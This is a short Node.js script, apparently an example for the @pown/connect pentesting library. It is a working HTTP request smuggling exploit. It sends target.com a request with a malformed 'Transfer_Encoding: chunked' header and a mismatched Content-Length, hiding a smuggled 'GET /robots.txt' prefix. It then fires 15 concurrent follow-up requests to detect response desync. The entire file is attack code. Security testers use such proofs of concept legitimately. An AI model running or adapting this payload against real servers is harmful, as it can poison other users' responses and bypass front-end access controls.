const { Scheduler } = require('@pown/connect/lib/scheduler')

const scheduler = new Scheduler()

const firstRequest = `POST / HTTP/1.1\r
Transfer_Encoding: chunked\r
Host: target.com\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\r
Content-type: application/x-www-form-urlencoded; charset=UTF-8\r
Content-Length: 52\r
\r
0\r
GET /robots.txt HTTP/1.1\r
Host: target.com\r
X-Ignore: X`

const subsequentRequest = `POST / HTTP/1.1\r
Transfer_Encoding: chunked\r
Host: target.com\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\r
Content-type: application/x-www-form-urlencoded; charset=UTF-8\r
Content-Length: 3\r
\r
0\r
`

scheduler
  .connect({
    timeout: 1000,
    host: 'target.com',
    data: firstRequest,
    port: 443,
    tls: true,
  })
  .then(async (response) => {
    console.log('---')
    console.log(response.responseData.toString())

    await Promise.all(
      Array(15)
        .fill(0)
        .map(async () => {
          const response = await scheduler.connect({
            timeout: 1000,
            host: 'target.com',
            data: subsequentRequest,
            port: 443,
            tls: true,
          })

          console.log('---')
          console.log(response.responseData.toString())
        })
    )
  })
